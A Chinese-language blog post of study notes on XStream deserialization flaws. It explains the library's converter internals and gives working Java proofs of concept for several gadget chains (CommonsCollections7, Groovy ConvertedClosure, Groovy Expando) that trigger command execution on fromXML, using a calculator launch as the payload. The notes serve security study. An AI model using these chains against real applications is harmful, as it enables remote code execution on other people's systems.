# XStream反序列化详解（一）
XStream 反序列化问题由来已久，从<=1.4.6版本之下的EventHandler利用方式，到20年的CVE-2020-26217，再到21年钟师傅、threedr3am、whit3p1g师傅们不要钱似的6个CVE。它的成因不同于fastjson之类，也有异于原生Java反序列化，很有特点，值得学习。

本节其实算是Wh1t3p1g师傅《回顾XStream反序列化漏洞》的学习笔记，也试着解释师傅没提到的一些细节问题。

[](#1-XStream-原理解析 "1. XStream 原理解析")1\. XStream 原理解析
-----------------------------------------------------

### [](#1-1-源码解析 "1.1 源码解析")1.1 源码解析

参考【3】  
![](_assets/pasted-136.png)

#### [](#Mapper "Mapper")Mapper

Mapper的作用类似alias，即将实际的class与xml元素名称对应起来。例如

*   sorted-set对应java.util.SortedSet

##### [](#XStream-mapper "XStream.mapper")XStream.mapper

是在`XStream.buildMapper()`中进行初始化

通过`Class type = HierarchicalStreams.readClassType(reader, mapper)`进行调用。

#### [](#Converter "Converter")Converter

Converter字面意义为转换器，负责对每个Java Object进行转换，比如有`IntConverter`、`CharConverter`、`TreeSetConverter`等等

##### [](#xstream-converterLookup "xstream.converterLookup")xstream.converterLookup

在`XStream.setupConverters()`中进行初始化

通过以下方式进行调用

```java
# 获取type 类型，type为class，eg java.util.SortdSet
Converter converter = converterLookup.lookupConverterForType(type);
# converter 值为TreeSetConverter
convert(parent, type, converter);
```

### [](#1-2-SerializableConverter "1.2 SerializableConverter")1.2 SerializableConverter

简单来讲，如果class 实现了Serializable，那么对应的Converter为SerializableConverter，如果没有，那么就是其他的Converter，依前文`lookupConverterForType(type)`中的type而定。

参考【2】中有着一部分的代码及调试，不赘述

### [](#1-3-CustomObjectInputStream "1.3 CustomObjectInputStream")1.3 CustomObjectInputStream

都知道反序列化是通过 `ObjectInputStream.readObject()`实现Input转Object的。针对实现了Serializable接口的类，XStream也是通过调用readObject进行转化的，但是Input是xml格式的，如何做到的呢？

`ObjectInputStream.readObject()`的实现流程如下：  
![](_assets/pasted-135.png)

可以看到Input会被解析成一个个类似TC_OBJECT的数据结构，Xstream 大致来说是通过CustomObjectInputStream实现这种解析xml结构的。

需要注意的是CustomObjectInputStream.StreamCallback 接口，在ExternalizableConverter和SerializableConverter 有不同的实现，以SerializableConverter为例：

```java
CustomObjectInputStream.StreamCallback callback = new CustomObjectInputStream.StreamCallback() {
    public Object readFromStream() {
      reader.moveDown();
      Class type = HierarchicalStreams.readClassType(reader, SerializableConverter.this.mapper);
      Object value = context.convertAnother(result, type);
      reader.moveUp();
      return value;
    }
```

[](#2-反序列化利用 "2. 反序列化利用")2\. 反序列化利用
-----------------------------------

引用Wh1t3p1g师傅的解释

> XStream反序列化同fastjson这种不一样的地方是fastjson会在反序列化的时候主动去调用getters和setters，而XStream的反序列化过程中赋值都由Java的反射机制来完成，所以并没有这样主动调用的特性。

> 但是还有一种利用方式，回想一下，在几条常规的java反序列化利用链上，都利用了HashMap、PriorityQueue等对象（key不可重复等特性）会自动去调用hashCode、equal、compareTo等这种函数。

讲的很明白了，强调一点：**java反序列化利用链，类必须要可Serializable，但是在Xstream上，并不是必须**，这里是一切利用链的根本原因。

1.  原Java反序列化链当然可以用
2.  寻找新的HashMap、PriorityQueue

### [](#2-1-原Java反序列化链 "2.1 原Java反序列化链")2.1 原Java反序列化链

这里贴一下基于cc7的poc

```java
public class CC7 {
    @Test
    public void ser() throws Exception {
        XStream xStream = new XStream();
        Object calc = new CommonsCollections7().getObject("open -a calculator.app");
        String xml = xStream.toXML(calc);
        System.out.println(xml);

        Object cc7 = xStream.fromXML(xml);
    }
}
```

### [](#2-2-寻找新的HashMap、PriorityQueue等 "2.2 寻找新的HashMap、PriorityQueue等")2.2 寻找新的HashMap、PriorityQueue等

Wh1t3p1g师傅文章中解释了这三个特殊的类

1.  MapConverter，会调用hashCode
2.  TreeSet/TreeMapConverter，会调用compareTo
3.  DynamicProxyConverter，创建了Proxy instance，InvocationHandler可控

师傅已经讲的很明白了，这里也不多讲，简单解释

#### [](#利用链 "利用链")利用链

##### [](#1-EventHandler "1. EventHandler")1\. EventHandler

这里涉及到java动态代理知识，用到的是TreeSetConverter+DynamicProxyConverter，poc原文有，就不贴了，简单解释下逻辑如下:

*   TreeSetConverter 当新插入一个key，会运行key的compareTo方法
    
    ```java
    treeMapConverter.populateTreeMap(reader, context, treeMap, unmarshalledComparator);
    ```
    
*   DynamicProxyConverter 实现生成代理类实例，重点是其中的handler可控
    
    ```java
    proxy = Proxy.newProxyInstance(classLoaderReference.getReference(), interfacesAsArray, handler);
    ```
    
*   EventHandler 就是这样理想的可控InvocationHandler。EventHandler 有属性target&action，其中target为object，action为method，EventHandler 的invoke实现上的逻辑最终会执行action.invoke(target,args)，其中target Demo为ProcessBuilder对象，action为start方法，最终实现RCE。
    
    ```java
    # 伪代码
    # proxy.compareTo()
    # EventHandler 被代理类会执行 invoke(proxy,"compareTo",arguments)
    public Object invoke(final Object proxy, final Method method, final Object[] arguments) 
    ```
    

其实理解了这个的逻辑，下面的几个都比较类似了

可以看出来，这个利用链的重点是EventHandler

##### [](#2-Groovy-ConvertedClosure "2. Groovy ConvertedClosure")2\. Groovy ConvertedClosure

Groovy ConvertedClosure 这个链其实和ysoserial 的Groovy1链类似，只不过Handler有点不一样。详细分析可以看看Groovy链的分析，师傅文章里有链接，blog里面也有这个链的简单分析。

###### [](#MethodClosure "MethodClosure")MethodClosure

Wh1t3p1g师傅提到的是这个姿势实现RCE

```java
Runtime runtime = Runtime.getRuntime();
MethodClosure mc = new MethodClosure(runtime, "exec");
mc.call("open -a calculator.app");
```

实际上，这样也可以触发（但是不带参数，暂时没找到可以无参数的后续利用链）

```java
MethodClosure mc = new MethodClosure("open -a calculator.app", "execute");
mc.call()
```

Groovy1链用的就是这种，恰好是无参数的触发。

###### [](#ConvertedClosure "ConvertedClosure")ConvertedClosure

```java
@Test
public void GroovyExpando() throws Exception {
    Runtime runtime = Runtime.getRuntime();
    MethodClosure mc = new MethodClosure(runtime, "exec");
    ConvertedClosure handler = new ConvertedClosure((Closure) mc, "compareTo");
    Object map = Proxy.newProxyInstance(
            GroovyConvertedClosure.class.getClassLoader(),
            new Class<?>[]{Comparable.class}, handler);
    TreeSet ts = PayloadHelper.makeTreeSet("open -a calculator.app", map);
    XStream xStream = new XStream();
    String xml = xStream.toXML(ts);
    System.out.println(xml);
    
    xStream.fromXML(xml);
}
```

##### [](#3-Groovy-Expando "3. Groovy Expando")3\. Groovy Expando

> 前面用到了TreeSet的方式，这里我们去使用Map的类型来触发。以Map的类型来触发，那就是找可以利用的hashCode函数

> groovy.util.Expando#hashCode

师傅的思路是从寻找hashCode，往上回溯

1.  groovy.util.Expando#hashCode 执行了closure.call()，其中closure来源为属性expandoProperties
2.  TreemapConverter 每次插入obj的时候，都会执行obj.hashCode

思路很简单，poc如下

```java
@Test
public void GroovyExpando1() throws Exception {
    MethodClosure mc = new MethodClosure("open -a calculator.app", "execute");
    Expando exp = new Expando();
    exp.setProperty("hashCode",mc);

    HashMap tp = PayloadHelper.makeMap("foo",exp);

    XStream xStream = new XStream();
    String xml = xStream.toXML(tp);
    System.out.println(xml);
    xStream.fromXML(xml);
}
```

其中用到的是MapConveter。

##### [](#4-ImageIO-ContainsFilter "4. ImageIO$ContainsFilter")4\. ImageIO$ContainsFilter

这个链比较长，思路来源是marshalsec的ImageIO gadget，逆向发现的确很难，Wh1t3p1g师傅也是从正向去跟踪的。

正向的复现师傅文章里也很详细了，不赘述了。

##### [](#5-ServiceFinder-LazyIterator "5. ServiceFinder$LazyIterator")5\. ServiceFinder$LazyIterator

这个链的思路最早【4】中orich1师傅的发现，过程也比较长，重点是从BCEL触发，寻找可用的lass.ForName()利用点，Iterator.next这里开始逆向发现新的链。Wh1t3p1g师傅的实现BCEL也很有亮点，很值得学习。

[](#小结 "小结")小结
--------------

本节简要介绍了XStream的序列化&反序列化的实现原理。java反序列化，类必须要可Serializable，但是在XStream上，并不是必须。针对非Seriablzable的类，XStream引入了多种Conveter实现这一过程。

其中EventHandler 和Groovy ConvertedClosure 都是利用到了TreeSetConveter & DynamicProxyConverter，Groovy Expando利用到了MapConverter。

遗留问题：

1.  gadget 4和5还需要再单独分析分析，Wh1t3p1g师傅的ysomap还有几个gadget，也需要再单独学习学习姿势。
2.  BCEL 这种通用的利用手法思路，有没有其他的APP。
3.  XStream 后续的几个CVE
4.  XStream 的黑名单安全手段，SecurityConveter

[](#参考 "参考")参考
--------------

*   \[1\] [回顾XStream反序列化漏洞](https://www.anquanke.com/post/id/204314)
*   \[2\] [Xstream 反序列化远程代码执行漏洞深入分析](https://paper.seebug.org/1543/)
*   \[3\] [XStream 源码解析](https://www.jianshu.com/p/387c568faf62)
*   \[4\] [jenkins 2.101 XStream rce 挖掘思路](https://www.anquanke.com/post/id/172198)
*   \[5\] [Jenkins 2.101 XStream Rce\[空指针CTF一月内部赛Writeup\]](https://meizjm3i.github.io/2020/01/09/Jenkins-2-101-XStream-Rce-%E7%A9%BA%E6%8C%87%E9%92%88CTF%E4%B8%80%E6%9C%88%E5%86%85%E9%83%A8%E8%B5%9BWriteup/)